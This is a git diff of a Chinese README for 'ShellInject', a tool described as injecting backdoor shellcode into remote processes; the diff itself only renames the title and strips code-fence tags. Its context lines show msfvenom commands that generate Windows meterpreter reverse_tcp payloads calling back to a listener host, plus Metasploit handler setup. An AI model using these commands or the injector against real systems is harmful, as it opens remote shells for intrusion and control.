@@ -1,4 +1,4 @@
-# Shellinject
+# ShellCode 后门内存注入器
 
 <br>
 
@@ -39,7 +39,7 @@ ShellInject 是一款通用ShellCode后门注入器，该工具主要用于在�
  - 15.注入加密后的字符串到远程进程
 
 首先需要通过`Metasploit`工具生成一个有效载荷，如下是32位与64位载荷生成命令。
-```C
+```
 32位载荷生成
 [root@lyshark ~]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.116 LPORT=9999 -f c
 
@@ -47,7 +47,7 @@ ShellInject 是一款通用ShellCode后门注入器，该工具主要用于在�
 [root@lyshark ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
 ```
 后台侦听器的配置也分为32位与64位，使用时需要与载荷的位数相对应。
-```C
+```
 32位侦听器配置
 msf6 > use exploit/multi/handler
 msf6 > set payload windows/meterpreter/reverse_tcp
